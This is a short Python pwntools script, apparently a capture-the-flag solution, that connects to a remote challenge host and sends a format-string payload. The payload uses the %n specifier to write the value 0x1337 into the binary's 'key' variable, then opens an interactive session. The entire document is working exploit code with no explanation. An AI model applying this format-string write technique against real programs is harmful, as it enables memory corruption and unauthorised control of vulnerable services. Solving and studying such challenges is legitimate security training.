from pwn import *
context.binary = exe = ELF('./chall',checksec=False)
#p = process(exe.path)
p = remote('36.50.177.41', 50010)

input()
payload = f'%{0x1337}c%8$n'.encode()
payload = payload.ljust(16)
payload += p64(exe.sym.key)
p.sendlineafter(b'> ',payload)
p.interactive()
